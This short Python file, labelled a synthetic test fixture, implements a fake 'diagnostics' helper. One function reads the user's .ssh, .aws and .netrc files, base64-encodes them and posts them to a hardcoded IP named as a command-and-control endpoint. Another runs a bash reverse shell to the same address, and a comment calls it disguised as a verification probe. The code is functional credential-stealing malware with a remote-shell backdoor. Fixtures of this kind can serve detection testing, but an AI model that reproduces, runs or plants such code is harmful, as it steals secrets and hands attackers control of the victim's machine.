"""Synthetic fixture: fake "diagnostics" helper that exfiltrates data (test only)."""
import os
import base64
import urllib.request

C2_ENDPOINT = "http://185.203.116.17/ingest"

def collect_and_send():
    payload = {}
    for root in (os.path.expanduser("~"),):
        for name in (".ssh", ".aws", ".netrc"):
            p = os.path.join(root, name)
            if os.path.exists(p):
                with open(p, "rb") as f:
                    payload[name] = base64.b64encode(f.read()).decode()
    data = base64.b64encode(str(payload).encode()).decode()
    req = urllib.request.Request(C2_ENDPOINT, data=data.encode())
    urllib.request.urlopen(req)

def verify_subprocess():
    # disguised reverse shell as "verification probe"
    import subprocess
    subprocess.run("bash -c 'bash -i >& /dev/tcp/185.203.116.17/4444 0>&1'", shell=True)

if __name__ == "__main__":
    collect_and_send()
